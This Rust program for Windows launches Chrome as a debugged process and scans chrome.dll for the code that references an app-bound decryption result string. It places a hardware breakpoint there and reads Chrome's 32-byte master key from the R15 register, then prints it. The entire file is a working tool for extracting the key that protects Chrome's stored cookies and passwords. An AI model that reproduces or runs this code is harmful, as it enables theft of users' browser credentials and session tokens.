#![allow(non_snake_case)]

use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::System::Threading::*;
use windows_sys::Win32::System::Diagnostics::Debug::*;
use windows_sys::Win32::System::Memory::*;
use windows_sys::Win32::System::LibraryLoader::*;
use windows_sys::Win32::System::ProcessStatus::*;
use windows_sys::Win32::Storage::FileSystem::*;
use windows_sys::Win32::Security::*;
use std::ptr::{null, null_mut};
use std::mem::{size_of, zeroed};

// Some missing definitions from windows-sys that might be architecture specific or in other modules
#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_DOS_HEADER {
    pub e_magic: u16,
    pub e_cblp: u16,
    pub e_cp: u16,
    pub e_crlc: u16,
    pub e_cparhdr: u16,
    pub e_minalloc: u16,
    pub e_maxalloc: u16,
    pub e_ss: u16,
    pub e_sp: u16,
    pub e_csum: u16,
    pub e_ip: u16,
    pub e_cs: u16,
    pub e_lfarlc: u16,
    pub e_ovno: u16,
    pub e_res: [u16; 4],
    pub e_oemid: u16,
    pub e_oeminfo: u16,
    pub e_res2: [u16; 10],
    pub e_lfanew: i32,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_SECTION_HEADER {
    pub Name: [u8; 8],
    pub Misc: IMAGE_SECTION_HEADER_0,
    pub VirtualAddress: u32,
    pub SizeOfRawData: u32,
    pub PointerToRawData: u32,
    pub PointerToRelocations: u32,
    pub PointerToLinenumbers: u32,
    pub NumberOfRelocations: u16,
    pub NumberOfLinenumbers: u16,
    pub Characteristics: u32,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub union IMAGE_SECTION_HEADER_0 {
    pub PhysicalAddress: u32,
    pub VirtualSize: u32,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_FILE_HEADER {
    pub Machine: u16,
    pub NumberOfSections: u16,
    pub TimeDateStamp: u32,
    pub PointerToSymbolTable: u32,
    pub NumberOfSymbols: u32,
    pub SizeOfOptionalHeader: u16,
    pub Characteristics: u16,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_DATA_DIRECTORY {
    pub VirtualAddress: u32,
    pub Size: u32,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_OPTIONAL_HEADER64 {
    pub Magic: u16,
    pub MajorLinkerVersion: u8,
    pub MinorLinkerVersion: u8,
    pub SizeOfCode: u32,
    pub SizeOfInitializedData: u32,
    pub SizeOfUninitializedData: u32,
    pub AddressOfEntryPoint: u32,
    pub BaseOfCode: u32,
    pub ImageBase: u64,
    pub SectionAlignment: u32,
    pub FileAlignment: u32,
    pub MajorOperatingSystemVersion: u16,
    pub MinorOperatingSystemVersion: u16,
    pub MajorImageVersion: u16,
    pub MinorImageVersion: u16,
    pub MajorSubsystemVersion: u16,
    pub MinorSubsystemVersion: u16,
    pub Win32VersionValue: u32,
    pub SizeOfImage: u32,
    pub SizeOfHeaders: u32,
    pub CheckSum: u32,
    pub Subsystem: u16,
    pub DllCharacteristics: u16,
    pub SizeOfStackReserve: u64,
    pub SizeOfStackCommit: u64,
    pub SizeOfHeapReserve: u64,
    pub SizeOfHeapCommit: u64,
    pub LoaderFlags: u32,
    pub NumberOfRvaAndSizes: u32,
    pub DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct IMAGE_NT_HEADERS64 {
    pub Signature: u32,
    pub FileHeader: IMAGE_FILE_HEADER,
    pub OptionalHeader: IMAGE_OPTIONAL_HEADER64,
}

// X64 Context
#[repr(C)]
#[cfg(target_arch = "x86_64")]
#[derive(Copy, Clone)]
pub struct CONTEXT {
    pub P1Home: u64,
    pub P2Home: u64,
    pub P3Home: u64,
    pub P4Home: u64,
    pub P5Home: u64,
    pub P6Home: u64,
    pub ContextFlags: u32,
    pub MxCsr: u32,
    pub SegCs: u16,
    pub SegDs: u16,
    pub SegEs: u16,
    pub SegFs: u16,
    pub SegGs: u16,
    pub SegSs: u16,
    pub EFlags: u32,
    pub Dr0: u64,
    pub Dr1: u64,
    pub Dr2: u64,
    pub Dr3: u64,
    pub Dr6: u64,
    pub Dr7: u64,
    pub Rax: u64,
    pub Rcx: u64,
    pub Rdx: u64,
    pub Rbx: u64,
    pub Rsp: u64,
    pub Rbp: u64,
    pub Rsi: u64,
    pub Rdi: u64,
    pub R8: u64,
    pub R9: u64,
    pub R10: u64,
    pub R11: u64,
    pub R12: u64,
    pub R13: u64,
    pub R14: u64,
    pub R15: u64,
    pub Rip: u64,
    pub Anonymous: CONTEXT_0,
    pub VectorRegister: [M128A; 26],
    pub VectorControl: u64,
    pub DebugControl: u64,
    pub LastBranchToRip: u64,
    pub LastBranchFromRip: u64,
    pub LastExceptionToRip: u64,
    pub LastExceptionFromRip: u64,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub union CONTEXT_0 {
    pub FltSave: XSAVE_FORMAT,
    pub Anonymous: CONTEXT_0_0,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct CONTEXT_0_0 {
    pub Header: [M128A; 2],
    pub Legacy: [M128A; 8],
    pub Xmm0: M128A,
    pub Xmm1: M128A,
    pub Xmm2: M128A,
    pub Xmm3: M128A,
    pub Xmm4: M128A,
    pub Xmm5: M128A,
    pub Xmm6: M128A,
    pub Xmm7: M128A,
    pub Xmm8: M128A,
    pub Xmm9: M128A,
    pub Xmm10: M128A,
    pub Xmm11: M128A,
    pub Xmm12: M128A,
    pub Xmm13: M128A,
    pub Xmm14: M128A,
    pub Xmm15: M128A,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct M128A {
    pub Low: u64,
    pub High: i64,
}

#[repr(C)]
#[derive(Copy, Clone)]
pub struct XSAVE_FORMAT {
    pub ControlWord: u16,
    pub StatusWord: u16,
    pub TagWord: u8,
    pub Reserved1: u8,
    pub ErrorOpcode: u16,
    pub ErrorOffset: u32,
    pub ErrorSelector: u16,
    pub Reserved2: u16,
    pub DataOffset: u32,
    pub DataSelector: u16,
    pub Reserved3: u16,
    pub MxCsr: u32,
    pub MxCsr_Mask: u32,
    pub FloatRegisters: [M128A; 8],
    pub XmmRegisters: [M128A; 16],
    pub Reserved4: [u8; 96],
}

pub const CONTEXT_AMD64: u32 = 0x00100000;
pub const CONTEXT_CONTROL: u32 = CONTEXT_AMD64 | 0x00000001;
pub const CONTEXT_INTEGER: u32 = CONTEXT_AMD64 | 0x00000002;
pub const CONTEXT_SEGMENTS: u32 = CONTEXT_AMD64 | 0x00000004;
pub const CONTEXT_FLOATING_POINT: u32 = CONTEXT_AMD64 | 0x00000008;
pub const CONTEXT_DEBUG_REGISTERS: u32 = CONTEXT_AMD64 | 0x00000010;
pub const CONTEXT_FULL: u32 = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS;

#[link(name = "kernel32")]
extern "system" {
    pub fn CreateProcessW(
        lpapplicationname: *const u16,
        lpcommandline: *mut u16,
        lpprocessattributes: *const SECURITY_ATTRIBUTES,
        lpthreadattributes: *const SECURITY_ATTRIBUTES,
        binherithandles: BOOL,
        dwcreationflags: PROCESS_CREATION_FLAGS,
        lpenvironment: *const std::ffi::c_void,
        lpcurrentdirectory: *const u16,
        lpstartupinfo: *const STARTUPINFOW,
        lpprocessinformation: *mut PROCESS_INFORMATION,
    ) -> BOOL;
    pub fn GetThreadContext(hthread: HANDLE, lpcontext: *mut CONTEXT) -> BOOL;
    pub fn SetThreadContext(hthread: HANDLE, lpcontext: *const CONTEXT) -> BOOL;
}

fn main() {
    unsafe {
        let mut si: STARTUPINFOW = zeroed();
        si.cb = size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = zeroed();

        let mut chrome_cmd: Vec<u16> = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --no-first-run --no-default-browser-check\0"
            .encode_utf16()
            .collect();

        let success = CreateProcessW(
            null(),
            chrome_cmd.as_mut_ptr(),
            null(),
            null(),
            FALSE,
            DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE,
            null(),
            null(),
            &si,
            &mut pi,
        );

        if success == 0 {
            eprintln!("Failed to create Chrome process: {}", GetLastError());
            return;
        }

        println!("Started Chrome with PID: {}", pi.dwProcessId);

        debug_loop(pi.hProcess);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

unsafe fn debug_loop(h_process: HANDLE) {
    let mut debug_event: DEBUG_EVENT = zeroed();
    let mut chrome_dll_base: *mut std::ffi::c_void = null_mut();
    let mut target_address: usize = 0;

    loop {
        if WaitForDebugEvent(&mut debug_event, INFINITE) == 0 {
            break;
        }

        match debug_event.dwDebugEventCode {
            LOAD_DLL_DEBUG_EVENT => {
                let load_dll = debug_event.u.LoadDll;
                let mut buffer = [0u16; 260];
                let len = GetFinalPathNameByHandleW(load_dll.hFile, buffer.as_mut_ptr(), buffer.len() as u32, 0);
                if len > 0 {
                    let path = String::from_utf16_lossy(&buffer[..len as usize]);
                    if path.contains("chrome.dll") {
                        println!("Found chrome.dll at {:?}", load_dll.lpBaseOfDll);
                        chrome_dll_base = load_dll.lpBaseOfDll;
                        target_address = find_target_address(h_process, chrome_dll_base);
                        if target_address != 0 {
                            set_hardware_breakpoint(debug_event.dwThreadId, target_address);
                        }
                    }
                }
            }
            CREATE_THREAD_DEBUG_EVENT => {
                if target_address != 0 {
                    set_hardware_breakpoint(debug_event.dwThreadId, target_address);
                }
            }
            EXCEPTION_DEBUG_EVENT => {
                let exception = debug_event.u.Exception;
                if exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP {
                    if exception.ExceptionRecord.ExceptionAddress as usize == target_address {
                        println!("Breakpoint hit at target address!");
                        extract_key(debug_event.dwThreadId, h_process);
                    }
                }
            }
            EXIT_PROCESS_DEBUG_EVENT => {
                break;
            }
            _ => {}
        }

        ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
    }
}

unsafe fn find_target_address(h_process: HANDLE, base_addr: *mut std::ffi::c_void) -> usize {
    let mut dos_header: IMAGE_DOS_HEADER = zeroed();
    let mut bytes_read = 0;
    if ReadProcessMemory(h_process, base_addr, &mut dos_header as *mut _ as *mut _, size_of::<IMAGE_DOS_HEADER>(), &mut bytes_read) == 0 {
        return 0;
    }

    let nt_headers_ptr = (base_addr as usize + dos_header.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
    let mut nt_headers: IMAGE_NT_HEADERS64 = zeroed();
    if ReadProcessMemory(h_process, nt_headers_ptr as *const _, &mut nt_headers as *mut _ as *mut _, size_of::<IMAGE_NT_HEADERS64>(), &mut bytes_read) == 0 {
        return 0;
    }

    let section_count = nt_headers.FileHeader.NumberOfSections;
    let mut sections = Vec::with_capacity(section_count as usize);
    let section_header_ptr = (nt_headers_ptr as usize + size_of::<IMAGE_NT_HEADERS64>()) as *mut IMAGE_SECTION_HEADER;

    for i in 0..section_count {
        let mut section: IMAGE_SECTION_HEADER = zeroed();
        ReadProcessMemory(h_process, (section_header_ptr as usize + i as usize * size_of::<IMAGE_SECTION_HEADER>()) as *const _, &mut section as *mut _ as *mut _, size_of::<IMAGE_SECTION_HEADER>(), &mut bytes_read);
        sections.push(section);
    }

    let target_string = "OSCrypt.AppBoundProvider.Decrypt.ResultCode";
    let mut string_va = 0;

    for section in &sections {
        let name = std::str::from_utf8(&section.Name).unwrap_or("").trim_matches('\0');
        if name == ".rdata" {
            let section_data = read_process_memory_chunk(h_process, (base_addr as usize + section.VirtualAddress as usize) as *const _, section.Misc.VirtualSize as usize);
            if let Some(pos) = find_subsequence(&section_data, target_string.as_bytes()) {
                string_va = base_addr as usize + section.VirtualAddress as usize + pos;
                println!("Found target string at 0x{:X}", string_va);
                break;
            }
        }
    }

    if string_va == 0 { return 0; }

    for section in &sections {
        let name = std::str::from_utf8(&section.Name).unwrap_or("").trim_matches('\0');
        if name == ".text" {
            let section_start = base_addr as usize + section.VirtualAddress as usize;
            let section_data = read_process_memory_chunk(h_process, section_start as *const _, section.Misc.VirtualSize as usize);

            // Search for LEA RCX, [RIP + offset] (48 8D 0D XX XX XX XX)
            let mut pos = 0;
            while pos + 7 <= section_data.len() {
                if section_data[pos..pos+3] == [0x48, 0x8D, 0x0D] {
                    let offset = i32::from_le_bytes(section_data[pos+3..pos+7].try_into().unwrap());
                    let rip = section_start + pos + 7;
                    let target = (rip as i64 + offset as i64) as usize;

                    if target == string_va {
                        println!("Found matching LEA instruction at 0x{:X}", section_start + pos);
                        return section_start + pos;
                    }
                }
                pos += 1;
            }
        }
    }

    0
}

fn read_process_memory_chunk(h_process: HANDLE, addr: *const std::ffi::c_void, size: usize) -> Vec<u8> {
    let mut buffer = vec![0u8; size];
    let mut bytes_read = 0;
    unsafe {
        ReadProcessMemory(h_process, addr, buffer.as_mut_ptr() as *mut _, size, &mut bytes_read);
    }
    buffer
}

fn find_subsequence(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack.windows(needle.len()).position(|window| window == needle)
}

unsafe fn set_hardware_breakpoint(thread_id: u32, address: usize) {
    let h_thread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, thread_id);
    if h_thread == 0 {
        return;
    }

    SuspendThread(h_thread);

    let mut context: CONTEXT = zeroed();
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if GetThreadContext(h_thread, &mut context) != 0 {
        context.Dr0 = address as u64;
        context.Dr7 = (context.Dr7 & !0b11) | 0b01; // Enable DR0 local
        SetThreadContext(h_thread, &context);
    }

    ResumeThread(h_thread);
    CloseHandle(h_thread);
}

unsafe fn extract_key(thread_id: u32, h_process: HANDLE) {
    let h_thread = OpenThread(THREAD_GET_CONTEXT, FALSE, thread_id);
    if h_thread == 0 {
        return;
    }

    let mut context: CONTEXT = zeroed();
    context.ContextFlags = CONTEXT_FULL;
    if GetThreadContext(h_thread, &mut context) != 0 {
        // According to the article, R15 holds the key pointer for Chrome
        let key_ptr = context.R15;
        println!("Key pointer in R15: 0x{:X}", key_ptr);

        let mut key = [0u8; 32]; // Masterkey is typically 32 bytes
        let mut bytes_read = 0;
        if ReadProcessMemory(h_process, key_ptr as *const _, key.as_mut_ptr() as *mut _, key.len(), &mut bytes_read) != 0 {
            println!("Extracted Master Key: {:02X?}", key);
        }
    }

    CloseHandle(h_thread);
}
